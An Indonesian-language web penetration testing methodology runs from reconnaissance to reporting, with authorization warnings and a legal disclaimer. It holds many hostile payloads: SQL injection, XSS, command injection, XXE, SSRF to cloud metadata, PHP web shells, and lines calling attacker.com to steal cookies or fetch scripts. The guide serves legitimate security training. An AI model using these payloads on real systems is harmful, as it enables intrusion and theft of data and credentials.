# Metodologi Pengujian Penetrasi Aplikasi Web

## PENGINGAT KRITIS

⚠️ **WAJIB ADA OTORISASI**

* Dapatkan izin tertulis SEBELUM melakukan pengujian
* Definisikan ruang lingkup dengan jelas (domain, IP, endpoint)
* Sepakati waktu/jendela pengujian
* Bangun saluran komunikasi
* Dokumentasikan semuanya

⚠️ **SELALU PATUHI SCOPE**

* Uji HANYA target yang sudah diotorisasi
* Jangan melakukan pivot ke sistem di luar scope
* Jangan uji sistem produksi saat jam kerja (kecuali ada izin tertulis)
* Segera berhenti jika menemukan data sensitif

---

## RINGKASAN METODOLOGI

```text
Phase 1: Information Gathering (Reconnaissance)
Phase 2: Application Mapping & Analysis
Phase 3: Vulnerability Discovery
Phase 4: Exploitation & Validation
Phase 5: Post-Exploitation (if authorized)
Phase 6: Documentation & Reporting
```

**Alokasi Waktu:** (untuk engagement 40 jam yang umum)

* Phase 1: 4–6 jam (10–15%)
* Phase 2: 6–8 jam (15–20%)
* Phase 3: 12–16 jam (30–40%)
* Phase 4: 8–12 jam (20–30%)
* Phase 5: 2–4 jam (5–10%)
* Phase 6: 4–6 jam (10–15%)

---

## PHASE 1: INFORMATION GATHERING (RECONNAISSANCE)

**Tujuan:** Memahami target, teknologi yang digunakan, dan permukaan serangan (attack surface)

### 1.1 Passive Reconnaissance (Tanpa Kontak Langsung)

#### A. Penemuan Domain & Subdomain

```bash
# Enumerasi subdomain
subfinder -d target.com -all -recursive -o subdomains.txt
amass enum -passive -d target.com -o amass_subs.txt
assetfinder --subs-only target.com > assetfinder_subs.txt

# Gabungkan dan hilangkan duplikat
cat subdomains.txt amass_subs.txt assetfinder_subs.txt | sort -u > all_subdomains.txt

# Validasi host yang hidup (live)
httpx -l all_subdomains.txt -o live_hosts.txt -title -tech-detect -status-code
```

**Tools:**

* subfinder, amass, assetfinder, chaos
* crt.sh, censys, shodan

#### B. Technology Fingerprinting

```bash
# Deteksi teknologi
whatweb -v -a 3 https://target.com
wappalyzer https://target.com

# Cek HTTP header
curl -I https://target.com

# Identifikasi CMS/Framework
# WordPress: /wp-admin, /wp-content
# Drupal: /user/login, CHANGELOG.txt
# Next.js: /_next/static
# React: view-source untuk pola React
```

**Cari informasi terkait:**

* Web server (Apache, Nginx, IIS)
* Bahasa pemrograman (PHP, Python, Node.js, Java)
* Framework (Laravel, Django, Express, Spring)
* CMS (WordPress, Drupal, Joomla)
* JavaScript framework (React, Angular, Vue, Next.js)
* WAF (Cloudflare, Akamai, AWS WAF)
* CDN
* Cloud provider (AWS, Azure, GCP)

#### C. OSINT (Open Source Intelligence)

```bash
# Google Dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com inurl:login
site:target.com inurl:config
site:target.com ext:sql
site:target.com ext:env
site:target.com "Index of /"

# Recon GitHub/GitLab
# Cari: target.com, API keys, credentials, file konfigurasi
# Tools: truffleHog, GitDorker, GittyLeaks

# Shodan/Censys
shodan search hostname:target.com
shodan search ssl:target.com

# Wayback Machine
waybackurls target.com > wayback_urls.txt
gau target.com > gau_urls.txt
```

**Cari hal-hal seperti:**

* Kredensial yang terekspos di GitHub
* API key, token
* Subdomain lama/terlantar
* Lingkungan development/staging
* Panel admin
* Dokumentasi
* Email karyawan (untuk social engineering jika masuk scope)

#### D. DNS Reconnaissance

```bash
# Enumerasi DNS
dig target.com ANY
nslookup target.com
host -a target.com

# DNS zone transfer (jarang, tapi layak dicek)
dig axfr @ns1.target.com target.com

# Reverse DNS
dig -x <IP_ADDRESS>
```

### 1.2 Active Reconnaissance (Kontak Langsung)

#### A. Port Scanning

```bash
# Scan cepat (port populer)
nmap -sV -sC -T4 --top-ports 1000 target.com -oN nmap_quick.txt

# Scan penuh (semua port) - jika waktu memungkinkan
nmap -p- -sV -sC -T4 target.com -oN nmap_full.txt

# Port yang umum untuk web
nmap -p 80,443,8080,8443,3000,5000,8000,8888 -sV target.com
```

**Port Web yang Umum:**

* 80 (HTTP)
* 443 (HTTPS)
* 8080, 8443 (HTTP/HTTPS alternatif)
* 3000 (development Node.js)
* 5000 (development Flask)
* 8000 (development Django)
* 8888 (Jupyter, HTTP alternatif)

#### B. Web Application Fingerprinting

```bash
# Scan Nikto (dasar)
nikto -h https://target.com -o nikto_results.txt

# Scan Nuclei (komprehensif)
nuclei -u https://target.com -tags tech,panel,exposure -o nuclei_results.txt
```

---

## PHASE 2: APPLICATION MAPPING & ANALYSIS

**Tujuan:** Memetakan struktur aplikasi secara menyeluruh dan memahami fungsionalitasnya

### 2.1 Eksplorasi Manual (KRITIS – Jangan Dilewati)

#### A. Jelajahi Aplikasi

1. **Daftar akun** (jika memungkinkan)

2. **Peta semua fungsionalitas:**

   * Autentikasi (login, register, reset password)
   * Otorisasi (role user, permission)
   * Manajemen profil
   * Fitur pencarian
   * Upload file
   * Pemrosesan pembayaran
   * Endpoint API
   * Panel admin
   * Bagian bantuan/dokumentasi

3. **Dokumentasikan setiap fitur:**

   * Fitur ini melakukan apa?
   * Input apa saja yang diterima?
   * Menggunakan HTTP method apa? (GET, POST, PUT, DELETE)
   * Parameter apa saja?
   * Responnya seperti apa?

4. **Cari fungsionalitas tersembunyi:**

   * Cek robots.txt
   * Cek sitemap.xml
   * Lihat source page untuk kode yang di-comment
   * Cek file JavaScript untuk endpoint
   * Gunakan developer tools browser (tab Network)

#### B. Intersep Traffic dengan Burp Suite

```text
Setup:
1. Konfigurasi Burp sebagai proxy (127.0.0.1:8080)
2. Install sertifikat CA Burp di browser
3. Aktifkan "Intercept" di tab Proxy
4. Jelajahi seluruh aplikasi
5. Cek HTTP History untuk semua request
```

**Hal-hal Penting yang Dicek:**

* Parameter tersembunyi
* Endpoint API
* Session token
* Atribut cookie
* Header (terutama custom header)
* Pola request/response

### 2.2 Automated Crawling & Spidering

#### A. Content Discovery

```bash
# Brute force direktori/file
ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt -mc 200,301,302,401,403 -o ffuf_results.txt

# Wordlist umum:
# - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# - /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
# - /usr/share/seclists/Discovery/Web-Content/common.txt

# Feroxbuster (rekursif)
feroxbuster -u https://target.com -w /path/to/wordlist.txt -x php,html,js,txt,json -o ferox_results.txt

# Gobuster
gobuster dir -u https://target.com -w /path/to/wordlist.txt -x php,html,js -o gobuster_results.txt
```

**Path yang Umum Menarik:**

* /admin, /administrator
* /api, /api/v1, /api/v2
* /config, /configuration
* /backup, /backups
* /old, /test, /dev
* /console, /dashboard
* /swagger, /api-docs
* /.git, /.env, /config.php
* /phpinfo.php, /info.php
* /wp-admin (WordPress)
* /debug, /trace

#### B. Penemuan Parameter

```bash
# Cari parameter tersembunyi
arjun -u https://target.com/endpoint -o arjun_params.txt

# Atau gunakan Burp Suite extensions:
# - Param Miner
# - GAP (Burp)
```

#### C. Analisis JavaScript

```bash
# Ekstrak endpoint dari file JS
python3 linkfinder.py -i https://target.com/app.js -o cli

# Download semua file JS dan analisis
wget -r -l1 -H -t1 -nd -N -np -A.js https://target.com/
grep -r "api\|endpoint\|/v1\|/v2\|token\|key\|password" *.js

# Gunakan tools:
# - JSFinder
# - SecretFinder
# - relative-url-extractor
```

### 2.3 Penemuan & Dokumentasi API

#### A. Temukan Endpoint API

```bash
# Cari dokumentasi API
curl https://target.com/api
curl https://target.com/api-docs
curl https://target.com/swagger
curl https://target.com/docs
curl https://target.com/graphql
curl https://target.com/v1
curl https://target.com/api/v1/health

# GraphQL introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

#### B. Setup Pengujian API

* Dokumentasikan semua endpoint API
* Pahami mekanisme autentikasi (JWT, API key, OAuth)
* Uji dengan HTTP method yang berbeda
* Cek versi (v1, v2, v3)

---

## PHASE 3: VULNERABILITY DISCOVERY

**Tujuan:** Mengidentifikasi kerentanan keamanan secara sistematis

### 3.1 Authentication & Session Management

#### A. Authentication Bypass

```text
Test Cases:
1. SQL injection di form login
   Username: admin' OR '1'='1' --
   Password: apa saja

2. NoSQL injection (MongoDB)
   Username: {"$gt": ""}
   Password: {"$gt": ""}

3. LDAP injection
   Username: *)(&
   Password: apa saja

4. Default credentials
   admin:admin, admin:password, root:root, test:test

5. Kelemahan reset password
   - Token tidak dibatalkan setelah digunakan
   - Token dapat diprediksi
   - Token dikirim di URL
   - Host header injection
   - Race condition

6. Kerentanan JWT
   - Algoritma none (alg: none)
   - Secret lemah (bruteforce dengan jwt_tool)
   - Key confusion (RS256 ke HS256)
   - Signature tidak diverifikasi
```

**Tools:**

```bash
# Pengujian JWT
jwt_tool <JWT_TOKEN> -t https://target.com/api/endpoint -rh "Authorization: Bearer JWT_HERE"

# Bruteforce
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

#### B. Session Management

```text
Cek:
1. Session fixation
2. Session tidak diinvalidasi saat logout
3. Session concurrent diizinkan
4. Session token di URL
5. Tidak ada session timeout
6. Session ID lemah (dapat diprediksi)
7. Cookie tanpa flag Secure (di atas HTTPS)
8. Cookie tanpa flag HttpOnly
9. Tidak ada atribut SameSite
10. Session token terekspos di log/Referer
```

**Pengujian dengan Burp:**

* Tangkap session token
* Coba gunakan kembali setelah logout
* Coba gunakan di browser yang berbeda
* Cek randomisasi token (Burp Sequencer)

### 3.2 Authorization & Access Control

#### A. Horizontal Privilege Escalation (IDOR)

```text
Test Cases:
1. Manipulasi parameter user ID
   GET /api/user/123/profile  →  GET /api/user/124/profile
   
2. Manipulasi object ID
   GET /api/orders/1001  →  GET /api/orders/1002
   
3. Coba HTTP method berbeda
   Jika GET diblok, coba POST/PUT/DELETE
   
4. Parameter pollution
   /api/user?id=123&id=124
   
5. Manipulasi array
   /api/users?id[]=123&id[]=124
   
6. Prediksi UUID/GUID
   Jika menggunakan UUID, cek apakah dapat diprediksi
```

**Pengujian Otomatis:**

```bash
# Autorize (Burp extension) - otomatis menguji otorisasi
# Atau gunakan script custom:
for i in {1..1000}; do
  curl -H "Cookie: session=YOUR_SESSION" https://target.com/api/user/$i/profile
done
```

#### B. Vertical Privilege Escalation

```text
Test Cases:
1. Akses endpoint admin sebagai user biasa
   /admin, /api/admin, /administrator
   
2. Manipulasi parameter role
   POST /api/user/update
   {"role": "admin", "email": "attacker@evil.com"}
   
3. Mass assignment
   POST /api/register
   {"username": "test", "password": "test", "is_admin": true}
   
4. Manipulasi field GraphQL
   query { user { id, email, role, is_admin } }
   
5. Manipulasi role di cookie/JWT
   Ubah role: user → admin di payload JWT
```

### 3.3 Injection Vulnerabilities

#### A. SQL Injection (SQLi)

```text
Pengujian Manual:
1. Tes dasar
   ' OR '1'='1' --
   ' OR '1'='1' /*
   ') OR ('1'='1
   
2. Union-based
   ' UNION SELECT NULL, NULL, NULL --
   ' UNION SELECT username, password FROM users --
   
3. Time-based blind
   ' AND SLEEP(5) --
   ' AND IF(1=1, SLEEP(5), 0) --
   
4. Boolean-based blind
   ' AND 1=1 --  (True)
   ' AND 1=2 --  (False)
   
5. Error-based
   ' AND 1=CONVERT(int, (SELECT @@version)) --
```

**Otomatis:**

```bash
# sqlmap (sangat powerful tapi bising)
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# Dengan session terautentikasi
sqlmap -u "https://target.com/api/user?id=1" \
  --cookie="session=YOUR_SESSION_TOKEN" \
  --batch --dbs --level=5 --risk=3

# Request POST
sqlmap -r request.txt --batch --dbs
```

**Uji SEMUA Titik Input:**

* Parameter GET
* Parameter POST
* HTTP header (User-Agent, Referer, X-Forwarded-For)
* Cookie
* Field JSON
* Field XML
* Nama file

#### B. Cross-Site Scripting (XSS)

```text
Jenis:
1. Reflected XSS (di URL, dipantulkan kembali)
2. Stored XSS (disimpan di database)
3. DOM-based XSS (manipulasi melalui JavaScript)

Payload Dasar:
1. <script>alert(1)</script>
2. <img src=x onerror=alert(1)>
3. <svg onload=alert(1)>
4. javascript:alert(1)
5. <iframe src=javascript:alert(1)>

Bypass Filter:
1. Uppercase: <ScRiPt>alert(1)</sCrIpT>
2. URL encoding: %3Cscript%3Ealert(1)%3C/script%3E
3. Double encoding: %253Cscript%253E
4. Unicode: \u003cscript\u003e
5. HTML entities: &lt;script&gt;alert(1)&lt;/script&gt;
6. Event handler: <body onload=alert(1)>
7. Tag campuran huruf besar-kecil: <ScRiPt>alert(1)</sCrIpT>
```

**Otomatis:**

```bash
# XSStrike
python3 xsstrike.py -u "https://target.com/search?q=test"

# Dalfox
dalfox url https://target.com/search?q=test

# template XSS di nuclei
nuclei -u https://target.com -tags xss
```

**Lokasi Pengujian:**

* Kotak pencarian
* Kolom komentar
* Field profil (nama, bio, dll.)
* Parameter URL
* HTTP header
* Upload file (nama file, konten)

#### C. Command Injection

```text
Payload:
1. Dasar
   ; ls
   | ls
   & ls
   && ls
   || ls
   
2. Chaining
   ; whoami; ls -la
   | cat /etc/passwd
   
3. Backticks
   `whoami`
   $(whoami)
   
4. Dengan input
   file.txt; cat /etc/passwd #
   
5. Blind (time-based)
   ; sleep 10
   | ping -c 10 127.0.0.1

Tes di Windows:
   & dir
   | dir
   && dir
```

**Parameter yang Umum Rentan:**

* Operasi file (filename, path)
* Operasi jaringan (ping, traceroute, nslookup)
* Perintah sistem (convert, resize)
* Fungsi email (penerima, subjek)

#### D. XML External Entity (XXE)

```xml
Basic XXE:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>

SSRF via XXE:
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>

Out-of-band (OOB):
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

**Uji di:**

* XML parser
* Layanan SOAP
* Upload file (SVG, DOCX, XLSX)
* RSS feed
* Request SAML

#### E. Server-Side Request Forgery (SSRF)

```text
Payload:
1. Jaringan internal
   http://127.0.0.1
   http://localhost
   http://0.0.0.0
   http://[::1]
   http://192.168.1.1
   http://10.0.0.1
   http://172.16.0.1

2. Metadata cloud
   http://169.254.169.254/latest/meta-data/
   http://metadata.google.internal/computeMetadata/v1/
   http://169.254.169.254/metadata/instance?api-version=2021-02-01

3. Bypass filter
   http://127.1
   http://0x7f.0x0.0x0.0x1
   http://017700000001
   http://127.0.0.1.nip.io
   http://[::ffff:127.0.0.1]

4. Protocol smuggling
   gopher://127.0.0.1:6379/_SET%20key%20value
   dict://127.0.0.1:11211/stats
   file:///etc/passwd
```

**Parameter yang Diuji:**

* Parameter URL
* URL gambar/avatar
* Webhook URL
* Fitur generate PDF
* Parsing XML
* Fitur import file

#### F. Local/Remote File Inclusion (LFI/RFI)

```text
Payload LFI:
1. Dasar
   ../../../../etc/passwd
   ..%2F..%2F..%2F..%2Fetc%2Fpasswd
   
2. Null byte bypass (PHP lama)
   ../../../../etc/passwd%00
   
3. Wrapper (PHP)
   php://filter/convert.base64-encode/resource=index.php
   data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
   expect://whoami
   
4. Log poisoning
   ../../../../var/log/apache2/access.log
   (Setelah menyuntikkan kode PHP di User-Agent)

Payload RFI:
   http://attacker.com/shell.php
   \\attacker.com\share\shell.php
```

**Parameter yang Umum Rentan:**

* ?page=
* ?file=
* ?include=
* ?template=
* ?path=

### 3.4 Business Logic Vulnerabilities

```text
Test Cases:
1. Manipulasi harga
   - Ubah harga menjadi 0 atau negatif
   - Ubah quantity menjadi negatif (serangan refund)
   - Manipulasi kode diskon
   
2. Race condition
   - Request concurrent dalam jumlah banyak
   - Redeem gift card
   - Update saldo akun
   - Item dengan jumlah terbatas
   
3. Bypass alur bisnis
   - Lewati step pembayaran
   - Lewati step verifikasi
   - Akses langkah yang lebih lanjut secara langsung
   
4. Parameter tampering
   - Ubah ID user di pesanan
   - Ubah ongkos kirim
   - Ubah batas quantity produk
   
5. Bypass rate limiting
   - Tidak ada rate limit
   - Rate limit lemah
   - Bypass dengan IP/header berbeda
```

**Tools:**

```python
# Pengujian race condition (Turbo Intruder - Burp extension)
# Atau script Python:
import concurrent.futures
import requests

def send_request():
    return requests.post('https://target.com/redeem', data={'code': 'GIFT100'})

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    futures = [executor.submit(send_request) for _ in range(20)]
    results = [future.result() for future in futures]
```

### 3.5 File Upload Vulnerabilities

```text
Test Cases:
1. Unrestricted file upload
   - Upload PHP shell: <?php system($_GET['cmd']); ?>
   - Upload JSP shell
   - Upload ASP/ASPX shell
   
2. Bypass ekstensi
   - Double extension: shell.php.jpg
   - Null byte: shell.php%00.jpg
   - Manipulasi huruf: shell.PhP
   - Tambah ekstensi valid: shell.jpg.php
   
3. Bypass Content-Type
   - Ubah menjadi image/jpeg saat upload PHP
   
4. Bypass magic byte
   - Tambah GIF89a di awal file PHP
   
5. Path traversal di nama file
   - ../../shell.php
   - ..%2F..%2Fshell.php
   
6. File poliglot
   - GIF yang disisipi kode PHP
   
7. XXE melalui upload SVG/XML
   
8. XSS melalui upload SVG
   <svg onload=alert(1)>
```

**Pengujian:**

```bash
# Buat file uji
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
echo "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.php.gif

# Upload dan coba akses
curl https://target.com/uploads/shell.php?cmd=whoami
```

### 3.6 Security Misconfigurations

```text
Cek:
1. Default credentials
   - admin:admin, root:root
   - Cek dokumentasi untuk default credentials
   
2. Directory listing
   - Cek apakah /uploads/, /files/, /backup/ bisa di-browse
   
3. File sensitif yang terekspos
   - /.env, /config.php, /web.config
   - /.git/ (download dengan git-dumper)
   - /backup.zip, /db.sql
   - /.aws/credentials
   
4. Debug mode aktif
   - Stack trace terekspos
   - Pesan error yang verbose
   
5. Security header yang hilang
   - X-Frame-Options (Clickjacking)
   - X-Content-Type-Options
   - Strict-Transport-Security
   - Content-Security-Policy
   
6. Misconfigurasi CORS
   - Origin dipantulkan kembali (reflected)
   - Wildcard dengan kredensial
```

**Tools:**

```bash
# Cek security header
curl -I https://target.com

# Cek CORS
curl -H "Origin: https://evil.com" -I https://target.com/api/endpoint

# Ekspos Git
git-dumper https://target.com/.git/ ./git_dump
```

### 3.7 API-Specific Vulnerabilities

```text
Test Cases:
1. Excessive data exposure
   - Cek respon API untuk data sensitif
   - PII, token, internal ID
   
2. Mass assignment
   - Tambahkan parameter yang tidak diharapkan
   - {"is_admin": true, "role": "admin"}
   
3. Spesifik GraphQL
   - Introspection aktif
   - Field suggestion
   - Batching attack
   - Query sirkular (DoS)
   
4. Masalah versioning API
   - Uji /v1, /v2, /v3
   - Versi lama sering lebih rentan
   
5. Rate limiting
   - Serangan brute force
   - Exhaustion resource
   
6. Serangan JWT
   - Algoritma none
   - Secret lemah
   - Key confusion
```

**Pengujian GraphQL:**

```bash
# Introspection query
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# Batching attack
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"query { user(id:1) { email } }"},
    {"query":"query { user(id:2) { email } }"},
    ...repeat 1000 times...
  ]'
```

---

## PHASE 4: EXPLOITATION & VALIDATION

**Tujuan:** Membuktikan bahwa kerentanan dapat dieksploitasi dan menunjukkan dampaknya

### 4.1 Proof of Concept (PoC)

**Untuk Setiap Kerentanan:**

1. **Dokumentasikan langkah-langkah:**

   * Langkah reproduksi yang tepat
   * Screenshot/video
   * HTTP request/response
2. **Buat PoC yang berfungsi:**

   * Script Python
   * Perintah cURL
   * File request Burp
3. **Tunjukkan dampak:**

   * Data apa yang dapat diakses?
   * Aksi apa yang dapat dilakukan?
   * Apa dampak bisnisnya?

### 4.2 Panduan Eksploitasi

**Eksploitasi yang Aman:**

```text
LAKUKAN:
✓ Gunakan akun uji milik sendiri
✓ Uji di environment development/staging jika memungkinkan
✓ Batasi ekstraksi data (jangan dump seluruh database)
✓ Gunakan identifier unik dalam payload (untuk tracking)
✓ Berhenti ketika dampak sudah terbukti
✓ Dokumentasikan semuanya

JANGAN:
✗ Mengubah data produksi
✗ Menghapus data
✗ Mengakses data sensitif user lain lebih dari kebutuhan PoC
✗ Melakukan serangan DoS
✗ Menguji di jam kerja (tanpa persetujuan)
✗ Melakukan pivot ke jaringan internal (tanpa otorisasi)
```

### 4.3 Contoh PoC

#### SQL Injection PoC

```python
import requests

url = "https://target.com/api/user"
params = {
    "id": "1' UNION SELECT username, password FROM users WHERE id=1 --"
}

response = requests.get(url, params=params)
print(response.text)
```

#### IDOR PoC

```bash
# Akun Anda (korban)
curl -H "Cookie: session=VICTIM_SESSION" \
  https://target.com/api/user/123/profile

# Akun attacker yang mengakses milik korban
curl -H "Cookie: session=ATTACKER_SESSION" \
  https://target.com/api/user/123/profile
```

#### XSS PoC

```html
<!-- Payload -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- Atau laporkan dengan screenshot -->
1. Buka https://target.com/profile/edit
2. Masukkan payload di field "Bio": <script>alert(document.domain)</script>
3. Simpan profil
4. Buka https://target.com/profile/view
5. JavaScript dieksekusi di browser korban
```

---

## PHASE 5: POST-EXPLOITATION (Jika Diotorisasi)

**Tujuan:** Memahami dampak penuh dan potensi pergerakan lateral

### 5.1 Privilege Escalation (Jika Ada Shell)

```bash
# Enumerasi Linux
id
uname -a
cat /etc/passwd
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
netstat -tulpn

# Upload linpeas/linenum
wget http://attacker.com/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 5.2 Pivoting (Hanya jika diizinkan)

```bash
# Penemuan jaringan
ip addr
arp -a
netstat -ano

# Port forwarding (SSH)
ssh -L 8080:internal-server:80 user@target.com

# SOCKS proxy
ssh -D 9050 user@target.com
# Lalu gunakan proxychains
```

### 5.3 Data Exfiltration (Minimal untuk PoC)

```text
Panduan:
- Ambil HANYA data yang cukup untuk membuktikan dampak
- Gunakan data dummy/test jika memungkinkan
- Jangan download seluruh database
- Dokumentasikan apa SAJA yang BISA diakses
- Hapus semua data yang diekstrak setelah dilaporkan
```

---

## PHASE 6: DOCUMENTATION & REPORTING

**Tujuan:** Laporan yang jelas dan bisa ditindaklanjuti untuk remediasi

### 6.1 Template Dokumentasi Kerentanan

````markdown
## Judul Kerentanan
**Severity:** Critical/High/Medium/Low
**CVSS Score:** X.X
**CWE:** CWE-XXX

### Deskripsi
[Penjelasan yang jelas tentang kerentanan]

### Lokasi
- URL: https://target.com/vulnerable/endpoint
- Parameter: vulnerable_param
- Method: POST

### Dampak
[Dampak bisnis – apa yang bisa dilakukan attacker?]
- Akses data sensitif
- Modifikasi akun user
- Eksekusi kode arbitrer
- dll.

### Langkah Reproduksi
1. Langkah 1
2. Langkah 2
3. Langkah 3

### Proof of Concept
```bash
curl -X POST https://target.com/api \
  -d '{"payload": "malicious"}'
````

### Bukti

[Screenshot, HTTP request/response]

### Rekomendasi Perbaikan

[Perbaikan spesifik]

* Validasi input
* Update framework
* Implementasi autentikasi
* dll.

### Referensi

* Link OWASP
* Referensi CVE
* Dokumentasi

````

### 6.2 Struktur Laporan

```text
1. Executive Summary
   - Jumlah kerentanan
   - Breakdown severity
   - Temuan utama
   - Level risiko

2. Scope
   - Apa yang diuji
   - Apa yang tidak diuji
   - Metodologi pengujian

3. Findings
   - Kerentanan Critical (detail)
   - Kerentanan High (detail)
   - Kerentanan Medium (ringkasan)
   - Kerentanan Low (ringkasan)

4. Rekomendasi
   - Aksi segera
   - Peningkatan jangka panjang
   - Best practice keamanan

5. Lampiran
   - Daftar lengkap kerentanan
   - Tools yang digunakan
   - Timeline pengujian
````

### 6.3 Severity Rating (CVSS v3)

```text
CRITICAL (9.0-10.0)
- RCE tanpa autentikasi
- SQL injection dengan akses admin
- Bypass autentikasi secara penuh

HIGH (7.0-8.9)
- RCE dengan autentikasi
- Privilege escalation ke admin
- Ekspos data sensitif

MEDIUM (4.0-6.9)
- IDOR
- Stored XSS
- CSRF di fungsi sensitif

LOW (0.1-3.9)
- Reflected XSS (dampak terbatas)
- Information disclosure (minimal)
- Security header hilang
```

---

## TOOLS CHECKLIST

### Tools Esensial

```bash
# Reconnaissance
□ subfinder, amass, assetfinder
□ httpx, httpprobe
□ whatweb, wappalyzer
□ nmap

# Proxy & Interception
□ Burp Suite Professional (atau Community)
□ OWASP ZAP

# Content Discovery
□ ffuf, feroxbuster, gobuster
□ dirsearch

# Vulnerability Scanning
□ nuclei
□ nikto

# Exploitation
□ sqlmap
□ XSStrike, dalfox
□ jwt_tool
□ commix (command injection)

# API Testing
□ Postman
□ Insomnia
□ GraphQL Playground

# Misc
□ curl, wget
□ jq (parsing JSON)
□ python3 dengan library requests
```

### Wordlists

```text
□ SecLists (github.com/danielmiessler/SecLists)
□ Assetnote wordlists
□ Wordlist custom berdasarkan teknologi target
```

---

## COMMON PITFALLS TO AVOID

```text
✗ Menguji tanpa otorisasi yang benar
✗ Melewatkan pengujian manual (hanya mengandalkan scanner)
✗ Tidak menguji dengan role user yang berbeda
✗ Melewatkan endpoint API
✗ Mengabaikan kode sisi klien (JavaScript)
✗ Tidak menguji aplikasi mobile
✗ Lupa menguji HTTP method (GET/POST/PUT/DELETE/PATCH)
✗ Tidak mengecek versi API yang lebih lama
✗ Mengabaikan bug logic bisnis
✗ Dokumentasi yang buruk
✗ Tidak melakukan retest setelah perbaikan
```

---

## TIME MANAGEMENT TIPS

```text
1. Mulai dari quick win (scan otomatis)
2. Fokus dulu ke area high-impact (autentikasi, otorisasi)
3. Jangan terlalu lama terjebak di satu kerentanan
4. Pasang batas waktu per fase
5. Dokumentasi sambil jalan (jangan menumpuk di akhir)
6. Prioritaskan berdasarkan scope dan risiko
7. Jalankan scan otomatis sambil melakukan pengujian manual
8. Istirahat secukupnya untuk menjaga fokus
```

---

## QUICK WIN CHECKLIST

**2 Jam Pertama – Coba Cari Ini:**

```text
□ Default credentials
□ Direktori .git yang terekspos
□ File .env yang terekspos
□ Directory listing aktif
□ Subdomain takeover
□ IDOR di endpoint API
□ Endpoint API tanpa autentikasi
□ SQL injection di fitur pencarian
□ Reflected XSS di fitur pencarian
□ SSRF di field foto profil/URL
```

---

## FINAL CHECKLIST SEBELUM REPORTING

```text
□ Semua temuan sudah direproduksi dan dikonfirmasi
□ PoC dibuat untuk setiap kerentanan
□ Screenshot/bukti sudah dikumpulkan
□ Severity sudah ditetapkan dengan benar
□ Saran remediasi sudah disertakan
□ Laporan sudah direview dari sisi akurasi
□ Tidak ada data sensitif di laporan (redaksi jika perlu)
□ Bahasa yang digunakan profesional
□ Client sudah diberi tahu segera untuk isu critical
```

---

## EXAMPLE WORKFLOW (ENGAGEMENT 40 JAM)

### Day 1 (8 jam)

* 0–2 jam: Reconnaissance (pasif)
* 2–4 jam: Active recon, validasi subdomain
* 4–6 jam: Eksplorasi aplikasi secara manual
* 6–8 jam: Setup Burp, proxy traffic, dokumentasi aplikasi

### Day 2 (8 jam)

* 0–2 jam: Content discovery otomatis
* 2–4 jam: Uji mekanisme autentikasi
* 4–6 jam: Uji otorisasi (IDOR, privilege escalation)
* 6–8 jam: Pengujian SQL injection

### Day 3 (8 jam)

* 0–2 jam: Pengujian XSS
* 2–4 jam: SSRF, XXE, command injection
* 4–6 jam: Pengujian business logic
* 6–8 jam: Pengujian spesifik API

### Day 4 (8 jam)

* 0–2 jam: Pengujian file upload
* 2–4 jam: Pengujian session management
* 4–6 jam: Pengembangan exploit untuk temuan
* 6–8 jam: Retest, validasi semua temuan

### Day 5 (8 jam)

* 0–4 jam: Pengujian tambahan untuk temuan menarik
* 4–8 jam: Dokumentasi, penulisan laporan

---

## PROFESSIONAL COMMUNICATION

### Selama Pengujian

```text
✓ Segera informasikan isu critical ke client
✓ Ajukan pertanyaan ketika scope kurang jelas
✓ Berikan update status harian (jika diminta)
✓ Responsif terhadap pertanyaan client
```

### Saat Melaporkan Isu Kritis

```text
Subject: [URGENT] Critical Vulnerability Found - [Client Name]

Hi [Client],

During our penetration test, I've discovered a critical vulnerability that requires immediate attention:

Issue: SQL Injection in login form
Impact: Full database access, including user credentials
Affected: https://target.com/login

I'm documenting this now and will send detailed findings with remediation steps within the next hour. Please let me know if you need immediate assistance.

Temporary mitigation: [If applicable]

Best regards,
[Your Name]
```

---

## RESOURCES FOR CONTINUOUS LEARNING

```text
Dokumentasi:
- OWASP Testing Guide
- OWASP Top 10
- PortSwigger Web Security Academy
- Laporan-laporan yang dipublikasikan di HackerOne

Platform Latihan:
- PortSwigger Web Security Academy (lab GRATIS)
- HackTheBox
- TryHackMe
- PentesterLab
- Damn Vulnerable Web Application (DVWA)

Bug Bounty:
- HackerOne
- Bugcrowd
- Intigriti
- YesWeHack
```

---

## LEGAL DISCLAIMER

```text
Metodologi ini hanya untuk pengujian yang DIAUTORISASI.

Sebelum memulai pengujian APA PUN:
1. Dapatkan otorisasi tertulis
2. Definisikan scope dengan jelas
3. Tetapkan rules of engagement
4. Sepakati saluran komunikasi
5. Definisikan kriteria keberhasilan
6. Tetapkan jendela/waktu pengujian

Pengujian TANPA OTORISASI adalah ILEGAL dan dapat berakibat:
- Tuntutan pidana
- Gugatan perdata
- Kehilangan pekerjaan
- Kerusakan reputasi
- Sanksi finansial

SELALU lakukan pengujian secara bertanggung jawab dan etis.
```

---

## SUMMARY – STEP-BY-STEP CHECKLIST ANDA

```text
Phase 1: Information Gathering
  □ Enumerasi subdomain
  □ Technology fingerprinting
  □ Google dorking
  □ Recon GitHub
  □ Port scanning
